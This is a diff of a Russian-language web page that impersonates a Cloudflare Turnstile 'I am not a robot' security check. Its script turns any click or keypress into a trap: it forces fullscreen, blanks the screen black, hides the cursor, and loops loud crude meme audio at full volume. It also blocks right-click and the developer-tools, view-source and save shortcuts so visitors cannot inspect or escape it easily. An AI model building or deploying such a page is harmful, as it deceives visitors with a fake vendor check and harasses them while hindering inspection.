@@ -1,1 +1,237 @@
-<!DOCTYPE html><html lang="ru"><head><meta charset="utf-8"><title>Проверка безопасности</title><style>body{margin:0;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#fff;font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;cursor:default;user-select:none}.t{text-align:center;margin-bottom:20px}.t h1{font-size:24px;font-weight:400;color:#333;margin:0 0 10px 0}.t p{font-size:15px;color:#555;margin:0}.c{width:300px;height:70px;border:1px solid #e0e0e0;background:#fafafa;border-radius:3px;display:flex;align-items:center;padding:0 15px;box-sizing:border-box;cursor:pointer;box-shadow:0 0 4px rgba(0,0,0,.05);transition:.2s}.c:hover{background:#f0f0f0}.cb{width:28px;height:28px;background:#fff;border:2px solid #c1c1c1;border-radius:2px;margin-right:15px}.l{font-size:15px;color:#333;flex-grow:1}.lg{font-size:10px;color:#999;text-align:right;display:flex;flex-direction:column;align-items:flex-end}.lg b{font-size:13px;color:#555}</style></head><body><div class="t"><h1>Проверка безопасности подключения</h1><p>Перед доступом к сайту необходимо пройти проверку.</p></div><div class="c"><div class="cb"></div><div class="l">Я не робот</div><div class="lg"><b>Cloudflare</b>Конфиденциальность</div></div><script>const t=["music/67-fonk(1).mp3","music/67-gazan.mp3","music/bolgarochka.mp3","music/diadia_zloy.mp3","music/dildos.mp3","music/doug-walker-fast-clapping.mp3","music/shturval-udovolstviia.mp3","music/vash-syn-smotrit-sirena(1).mp3","music/vizg-svini.mp3"];const s=a=>{for(let i=a.length-1;i>0;i--){let j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]]}return a};let pl=s([...t]),i=0,p=!1;const a=new Audio;a.preload="auto";a.src=pl[i];a.addEventListener('ended',()=>{if(++i>=pl.length){pl=s([...t]);i=0}a.src=pl[i];a.play()});const f=()=>{if(!p){let e=document.documentElement;if(e.requestFullscreen)e.requestFullscreen();else if(e.webkitRequestFullscreen)e.webkitRequestFullscreen();a.volume=1;a.play();p=!0;document.body.style.background="#000";document.body.innerHTML="";document.body.style.cursor="none"}};window.addEventListener('click',f);window.addEventListener('keydown',f);document.addEventListener('contextmenu',e=>e.preventDefault());document.addEventListener('keydown',e=>{if(e.key==='F12'||(e.ctrlKey&&['s','S','u','U'].includes(e.key))||(e.ctrlKey&&e.shiftKey&&['I','i','C','c','J','j'].includes(e.key)))e.preventDefault()});</script></body></html>
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="utf-8">
+    <title>Проверка безопасности</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            cursor: default;
+            user-select: none;
+        }
+        .t {
+            text-align: center;
+            margin-bottom: 24px;
+            padding: 0 20px;
+        }
+        .t h1 {
+            font-size: 20px;
+            font-weight: 400;
+            color: #1e1e1e;
+            margin: 0 0 8px 0;
+            letter-spacing: -0.01em;
+        }
+        .t p {
+            font-size: 14px;
+            color: #5e5e5e;
+            margin: 0;
+            line-height: 1.4;
+        }
+        .captcha-container {
+            width: 300px;
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+            transition: box-shadow 0.2s ease, border-color 0.2s ease;
+            cursor: pointer;
+        }
+        .captcha-container:hover {
+            border-color: #b3b3b3;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.08);
+        }
+        .captcha-box {
+            display: flex;
+            align-items: center;
+            padding: 12px 14px;
+            box-sizing: border-box;
+            min-height: 62px;
+        }
+        .checkbox {
+            width: 24px;
+            height: 24px;
+            background: #fff;
+            border: 2px solid #c7c7c7;
+            border-radius: 4px;
+            margin-right: 16px;
+            position: relative;
+            transition: border-color 0.2s, background 0.2s;
+            flex-shrink: 0;
+        }
+        .captcha-container:hover .checkbox {
+            border-color: #9e9e9e;
+        }
+        .checkbox::after {
+            content: "";
+            position: absolute;
+            display: block;
+            left: 6px;
+            top: 2px;
+            width: 6px;
+            height: 12px;
+            border: solid #fff;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+            opacity: 0;
+            transition: opacity 0.1s;
+        }
+        .label {
+            font-size: 15px;
+            font-weight: 400;
+            color: #1a1a1a;
+            flex-grow: 1;
+            letter-spacing: -0.01em;
+        }
+        .cloudflare-brand {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            justify-content: center;
+            line-height: 1.3;
+        }
+        .cloudflare-logo {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            font-size: 11px;
+            font-weight: 500;
+            color: #6b6b6b;
+        }
+        .cloudflare-logo svg {
+            width: 16px;
+            height: 16px;
+            opacity: 0.7;
+        }
+        .privacy-link {
+            font-size: 9px;
+            color: #9e9e9e;
+            text-decoration: none;
+            margin-top: 2px;
+            letter-spacing: 0.02em;
+        }
+        .privacy-link:hover {
+            text-decoration: underline;
+        }
+        .captcha-footer {
+            border-top: 1px solid #f0f0f0;
+            padding: 8px 14px;
+            font-size: 10px;
+            color: #6b6b6b;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #fafafa;
+            border-bottom-left-radius: 8px;
+            border-bottom-right-radius: 8px;
+        }
+        .captcha-footer a {
+            color: #3b7cbf;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .captcha-footer a:hover {
+            text-decoration: underline;
+        }
+        .powered-by {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        * {
+            box-sizing: border-box;
+        }
+    </style>
+</head>
+<body>
+    <div class="t">
+        <h1>Проверка безопасности подключения</h1>
+        <p>Перед доступом к сайту необходимо пройти проверку.</p>
+    </div>
+
+    <div class="captcha-container" id="captchaTrigger">
+        <div class="captcha-box">
+            <div class="checkbox"></div>
+            <div class="label">Я не робот</div>
+            <div class="cloudflare-brand">
+                <div class="cloudflare-logo">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 4C9.79086 4 8 5.79086 8 8C8 8.74079 8.19654 9.43394 8.53463 10.0315C7.02553 10.1681 5.83557 11.4211 5.83557 12.9677C5.83557 14.6206 7.17443 15.9677 8.83557 15.9677H17.1644C18.8256 15.9677 20.1644 14.6206 20.1644 12.9677C20.1644 11.4211 18.9745 10.1681 17.4654 10.0315C17.8035 9.43394 18 8.74079 18 8C18 5.79086 16.2091 4 14 4C12.3979 4 11.0182 5.05616 10.5 6.5C10.0182 5.05616 8.6021 4 7 4C5.79086 4 4 5.79086 4 8C4 9.34682 4.6665 10.518 5.8 11.2" stroke="#6b6b6b" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    <span>Cloudflare</span>
+                </div>
+                <a href="#" class="privacy-link" onclick="event.stopPropagation();">Конфиденциальность</a>
+            </div>
+        </div>
+        <div class="captcha-footer">
+            <span>Проверка Cloudflare</span>
+            <div class="powered-by">
+                <span>Работает на</span>
+                <a href="#" onclick="event.stopPropagation();">Turnstile</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const t = [
+            "music/67-fonk(1).mp3",
+            "music/67-gazan.mp3",
+            "music/bolgarochka.mp3",
+            "music/diadia_zloy.mp3",
+            "music/dildos.mp3",
+            "music/doug-walker-fast-clapping.mp3",
+            "music/shturval-udovolstviia.mp3",
+            "music/vash-syn-smotrit-sirena(1).mp3",
+            "music/vizg-svini.mp3"
+        ];
+        const s = a => {
+            for (let i = a.length - 1; i > 0; i--) {
+                let j = Math.floor(Math.random() * (i + 1));
+                [a[i], a[j]] = [a[j], a[i]];
+            }
+            return a;
+        };
+        let pl = s([...t]),
+            i = 0,
+            p = !1;
+        const a = new Audio();
+        a.preload = "auto";
+        a.src = pl[i];
+        a.addEventListener('ended', () => {
+            if (++i >= pl.length) {
+                pl = s([...t]);
+                i = 0;
+            }
+            a.src = pl[i];
+            a.play();
+        });
+        const f = () => {
+            if (!p) {
+                let e = document.documentElement;
+                if (e.requestFullscreen) e.requestFullscreen();
+                else if (e.webkitRequestFullscreen) e.webkitRequestFullscreen();
+                a.volume = 1;
+                a.play();
+                p = !0;
+                document.body.style.background = "#000";
+                document.body.innerHTML = "";
+                document.body.style.cursor = "none";
+            }
+        };
+        document.querySelector('.captcha-container').addEventListener('click', f);
+        window.addEventListener('click', f);
+        window.addEventListener('keydown', f);
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || (e.ctrlKey && ['s','S','u','U'].includes(e.key)) || (e.ctrlKey && e.shiftKey && ['I','i','C','c','J','j'].includes(e.key)))
+                e.preventDefault();
+        });
+    </script>
+</body>
+</html>
